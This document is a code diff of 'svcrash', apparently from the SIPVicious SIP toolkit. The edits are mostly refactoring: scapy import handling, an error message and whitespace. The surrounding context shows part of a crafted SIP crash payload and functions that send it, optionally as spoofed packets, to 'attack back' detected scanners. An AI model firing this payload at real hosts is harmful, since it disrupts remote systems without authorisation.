@@ -24,6 +24,7 @@ __GPL__ = """
 import re
 import sys
 import time
+import scapy
 import logging
 import optparse
 import os.path
@@ -31,11 +32,13 @@ import random
 import select
 import socket
 import warnings
-from scapy.layers.inet import IP, UDP
-from scapy.all import send, Raw, sniff
+try:
+    from scapy.layers.inet import IP, UDP
+    from scapy.all import send, Raw, sniff
+    scapyversion = scapy.__version__
+except ImportError:
+    scapyversion = 0
 from .libs.svhelper import __author__, __version__
-
-scapyversion = 0
 warnings.filterwarnings("ignore")
 
 __prog__ = 'svcrash'
@@ -47,11 +50,9 @@ def getArgs():
                       dest="auto", default=False, action="store_true",)
     parser.add_option('--astlog', help="Path for the asterisk full logfile",
                       dest="astlog")
-    parser.add_option('-d', help="specify attacker's ip address", dest="ipaddr",
-                      )
+    parser.add_option('-d', help="specify attacker's ip address", dest="ipaddr")
     parser.add_option('-p', help="specify attacker's port", dest="port",
-                      type="int", default=5060
-                      )
+                      type="int", default=5060)
     parser.add_option('-b', help="bruteforce the attacker's port", dest="bruteforceport",
                       default=False, action="store_true")
     (options, args) = parser.parse_args()
@@ -62,7 +63,7 @@ def getArgs():
     elif options.auto:
         if scapyversion == 0:
             parser.error(
-                "You need to install scapy from http://www.secdev.org/projects/scapy/")
+                "You should have scapy installed for spoofing the packets: python3 -m pip install scapy.")
     elif options.astlog:
         if not os.path.exists(options.astlog):
             parser.error("Could not read %s" % options.astlog)
@@ -75,9 +76,7 @@ def getArgs():
                 "You either need have port 5060 available or install scapy from http://www.secdev.org/projects/scapy/")
     return options, args
 
-
 class asteriskreadlognsend:
-
     def __init__(self, logfn):
         self.log = None
         self.logfn = logfn
@@ -123,9 +122,7 @@ class asteriskreadlognsend:
         except KeyboardInterrupt:
             return
 
-
 class sniffnsend:
-
     def __init__(self, port=5060):
         self.port = port
         self.lastsent = 30
@@ -142,6 +139,7 @@ class sniffnsend:
         if not src in self.mytimer:
             # print "add %s:%s" % src
             self.mytimer[src] = time.time() - 2
+
         if time.time() - self.mytimer[src] > 2:
             if time.time() - self.lastsent > 0.5:
                 if ('User-Agent: friendly-scanner' in data) or \
@@ -151,6 +149,7 @@ class sniffnsend:
                         self.lastsent = time.time()
                         self.mytimer[src] = time.time()
                         sendattack2(ipaddr, port)
+
         if len(self.mytimer) > 0:
             for src in self.mytimer.keys():
                 if time.time() - self.mytimer[src] > 10:
@@ -171,7 +170,6 @@ crashmsg += '"100"<sip:100@localhost>; tag=683a653a7901746865726501627965\r\nUs'
 crashmsg += 'er-agent: Telkom Box 2.4\r\nTo: "100"<sip:100@localhost>\r\nCse'
 crashmsg += 'q: 1 REGISTER\r\nCall-id: 469585712\r\nMax-forwards: 70\r\n\r\n'
 
-
 def sendattack(ipaddr, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.bind(('0.0.0.0', 5060))
@@ -180,12 +178,10 @@ def sendattack(ipaddr, port):
     sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr, port))
     s.close()
 
-
 def sendattack2(ipaddr, port):
     packet = IP(dst=ipaddr) / UDP(sport=5060, dport=port) / crashmsg
     sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr, port))
     send(packet, verbose=0)
-
 
 def main():
     options, _ = getArgs()
